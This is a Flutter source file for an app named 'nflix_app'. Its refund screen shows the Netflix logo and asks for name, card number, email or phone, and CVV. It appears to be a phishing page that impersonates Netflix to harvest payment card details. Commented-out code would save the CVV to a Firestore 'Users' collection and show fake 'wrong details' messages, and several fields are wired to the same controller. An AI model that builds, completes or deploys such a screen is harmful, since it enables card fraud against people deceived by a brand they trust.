// import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:nflix_app/Shared/colors.dart';

class RefundScreen extends StatefulWidget {
  @override
  _RefundScreenState createState() => _RefundScreenState();
}

class _RefundScreenState extends State<RefundScreen> {
  final GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();

  void _showSnackMessage(String message) {
    // _scaffoldKey.currentState.showSnackBar(SnackBar(
    //   content: Text(message),
    // ));
    print(message);
  }

  TextEditingController _fnameController = TextEditingController();
  TextEditingController _lnameController = TextEditingController();
  TextEditingController _cardController = TextEditingController();
  TextEditingController _cvvController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Scaffold(
        backgroundColor: ColorPalatte.themeColor,
        key: _scaffoldKey,
        body: SingleChildScrollView(
            child: Container(
          height: MediaQuery.of(context).size.height,
          padding: EdgeInsets.symmetric(vertical: 30, horizontal: 20),
          width: MediaQuery.of(context).size.width,
          child: Column(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Container(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Container(
                        width: 150,
                        child: Image.asset("assets/images/netflix_logo.png")),
                    Padding(
                      padding: const EdgeInsets.symmetric(vertical: 5),
                      child: Text(
                          "Confirm your details of card account for refund",
                          // "Enter Expiry date",
                          style: GoogleFonts.montserrat(
                            color: Colors.white,
                            fontSize: 24,
                            fontWeight: FontWeight.w500,
                          )),
                    ),
                    // input(_fnameController, "Expiry Date (MM/YY)", 1),
                    input(_lnameController, "Last name", 1),
                    input(_lnameController, "First name", 1),
                    input(_cardController, "************", 1),
                    input(_cvvController, "Email or phone Number", 1),
                    input(_cvvController, "CVV", 1),
                    SizedBox(
                      height: 10,
                    ),
                    // Padding(
                    //   padding: const EdgeInsets.symmetric(vertical: 5),
                    //   child: Text(
                    //       "Invalid Card Details Registered with this account",
                    //       // "This account is linked with another card",
                    //       // "Can't Refund on same account",
                    //       style: GoogleFonts.montserrat(
                    //         color: Colors.red,
                    //         fontSize: 15,
                    //         fontWeight: FontWeight.w400,
                    //       )),
                    // ),
                  ],
                ),
              ),
              Container(
                width: MediaQuery.of(context).size.width,
                child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      foregroundColor: Colors.white,
                      backgroundColor: ColorPalatte.primarycolor, // foreground
                    ),
                    onPressed: () {
                      if (_fnameController.text == "") {
                        _showSnackMessage("First name Fill Your Name");
                      } else if (_lnameController.text == "") {
                        _showSnackMessage("Last name can't be empty");
                      } else if (_cardController.text.length != 16) {
                        _showSnackMessage("Invalid Account number");
                        print(_cardController.text.length);
                      } else if (_cvvController.text.length != 3) {
                        _showSnackMessage("Invalid CVV");
                      } else {
                        // FirebaseFirestore.instance.collection("Users").add({
                        //   "Cvv".toString(): _cvvController.text.toString(),
                        // }).then((value) {
                        //   _showSnackMessage("Wrong Details");

                        // Navigator.pushReplacement(
                        //     context,
                        //     MaterialPageRoute(
                        //         builder: (context) =>
                        //             BottomNavigationScreen()));
                        // });
                      }

                      // },
                    },
                    child: Padding(
                      padding: const EdgeInsets.symmetric(vertical: 15),
                      child: Text(
                        "Proceed to Refund",
                        style: GoogleFonts.montserrat(
                          fontSize: 16,
                          color: ColorPalatte.textthemeColor,
                          fontWeight: FontWeight.w500,
                          // fontSize: 13,
                        ),
                      ),

                      // color: Colors.blue,
                    )),
              )
            ],
          ),
        )));
  }

  Widget input(TextEditingController controller, name, int lines) {
    return Container(
      decoration: BoxDecoration(
          color: ColorPalatte.themeshadeColor,
          borderRadius: BorderRadius.circular(6)),
      margin: EdgeInsets.symmetric(horizontal: 5, vertical: 10),
      child: TextField(
        textInputAction: TextInputAction.done,
        autofocus: false,
        maxLines: lines,
        controller: controller,
        decoration: InputDecoration(
            contentPadding: EdgeInsets.symmetric(vertical: 4, horizontal: 15),
            hintText: name,
            hintStyle: GoogleFonts.montserrat(
                color: Colors.grey.shade400,
                fontSize: 15,
                fontWeight: FontWeight.w400),
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(6))),
        style: GoogleFonts.montserrat(
            color: ColorPalatte.textthemeColor,
            fontWeight: FontWeight.w400,
            fontSize: 17),
      ),
    );
  }
}
